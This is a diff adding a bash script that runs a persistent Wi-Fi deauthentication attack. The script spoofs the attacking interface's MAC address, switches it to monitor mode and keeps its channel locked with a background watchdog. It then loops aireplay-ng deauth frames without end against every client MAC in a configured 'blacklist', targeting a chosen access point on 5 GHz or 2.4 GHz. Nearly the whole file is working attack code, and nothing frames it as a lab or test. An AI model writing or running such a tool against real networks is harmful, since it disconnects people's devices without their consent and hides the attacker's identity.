@@ -1,0 +1,142 @@
+#!/bin/bash
+set -euo pipefail
+
+SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
+CONFIG_FILE="${CONFIG_FILE:-$SCRIPT_DIR/config}"
+
+if [ ! -f "$CONFIG_FILE" ]; then
+  echo "ERROR: Config file not found: $CONFIG_FILE" >&2
+  echo "Copy config.example to config and edit it with your values." >&2
+  exit 1
+fi
+
+source "$CONFIG_FILE"
+
+REQUIRED_VARS=(DRIVER_5G DRIVER_24G CHANNEL_5G CHANNEL_24G AP_BSSID_5G AP_BSSID_24G MAC_SPOOF BLACKLIST)
+for var in "${REQUIRED_VARS[@]}"; do
+  if [ -z "${!var:-}" ]; then
+    echo "ERROR: Required variable $var is not set in $CONFIG_FILE" >&2
+    exit 1
+  fi
+done
+
+WATCHDOG_INTERVAL="${WATCHDOG_INTERVAL:-60}"
+DEAUTH_COUNT="${DEAUTH_COUNT:-5}"
+DEAUTH_SLEEP="${DEAUTH_SLEEP:-3}"
+
+WATCHDOG_PID=""
+
+resolve_iface_by_driver() {
+  local target_driver="$1"
+  for path in /sys/class/net/wlan*; do
+    local name
+    name=$(basename "$path")
+    local drv
+    drv=$(basename "$(readlink "$path/device/driver")" 2>/dev/null) || continue
+    if [ "$drv" = "$target_driver" ]; then
+      echo "$name"
+      return 0
+    fi
+  done
+  echo "ERROR: No interface found for driver $target_driver" >&2
+  return 1
+}
+
+setup_monitor() {
+  local iface="$1" channel="$2" mac="$3"
+
+  echo "[*] Configuring $iface: monitor mode + channel $channel + MAC $mac"
+  sudo ip link set "$iface" down
+  sudo macchanger -m "$mac" "$iface"
+  sudo iw dev "$iface" set type monitor
+  sudo ip link set "$iface" up
+  sudo iw dev "$iface" set channel "$channel"
+  echo "[+] $iface ready in monitor mode, channel $channel"
+}
+
+channel_watchdog() {
+  local iface="$1" expected="$2"
+  while true; do
+    sleep "$WATCHDOG_INTERVAL"
+    local current
+    current=$(iw dev "$iface" info 2>/dev/null | awk '/channel/{print $2}') || true
+    if [ -n "$current" ] && [ "$current" != "$expected" ]; then
+      echo "[WATCHDOG] Channel drift on $iface: $current -> resetting to $expected"
+      sudo iw dev "$iface" set channel "$expected" 2>/dev/null || true
+    fi
+  done
+}
+
+cleanup() {
+  echo ""
+  echo "[*] Stopping attack..."
+  if [ -n "$WATCHDOG_PID" ]; then
+    kill "$WATCHDOG_PID" 2>/dev/null || true
+    wait "$WATCHDOG_PID" 2>/dev/null || true
+    echo "[*] Watchdog stopped"
+  fi
+  echo "[*] Exiting."
+  exit 0
+}
+
+usage() {
+  echo "Usage: $(basename "$0") <5g|24g>"
+  echo ""
+  echo "  5g   - Deauth attack on 5GHz (driver $DRIVER_5G, channel $CHANNEL_5G)"
+  echo "  24g  - Deauth attack on 2.4GHz (driver $DRIVER_24G, channel $CHANNEL_24G)"
+  echo ""
+  echo "Config file: $CONFIG_FILE"
+  exit 1
+}
+
+if [ $# -ne 1 ]; then
+  usage
+fi
+
+case "$1" in
+  5g)
+    DRIVER="$DRIVER_5G"
+    CHANNEL="$CHANNEL_5G"
+    AP_BSSID="$AP_BSSID_5G"
+    ;;
+  24g)
+    DRIVER="$DRIVER_24G"
+    CHANNEL="$CHANNEL_24G"
+    AP_BSSID="$AP_BSSID_24G"
+    ;;
+  *)
+    usage
+    ;;
+esac
+
+if [ ! -f "$BLACKLIST" ]; then
+  echo "ERROR: Blacklist file not found: $BLACKLIST" >&2
+  exit 1
+fi
+
+echo "[*] Resolving interface for driver $DRIVER..."
+IFACE=$(resolve_iface_by_driver "$DRIVER")
+echo "[+] Interface found: $IFACE"
+
+setup_monitor "$IFACE" "$CHANNEL" "$MAC_SPOOF"
+
+trap cleanup INT TERM
+
+channel_watchdog "$IFACE" "$CHANNEL" &
+WATCHDOG_PID=$!
+echo "[+] Channel watchdog started (PID $WATCHDOG_PID, interval ${WATCHDOG_INTERVAL}s)"
+
+echo "[*] Starting deauth attack against AP $AP_BSSID on $IFACE (channel $CHANNEL)..."
+echo ""
+
+while true; do
+  while read -r mac _; do
+    [ -z "$mac" ] && continue
+    [[ "$mac" == \#* ]] && continue
+    sudo aireplay-ng --deauth "$DEAUTH_COUNT" \
+      -a "$AP_BSSID" \
+      -c "$mac" \
+      "$IFACE"
+    sleep "$DEAUTH_SLEEP"
+  done < "$BLACKLIST"
+done
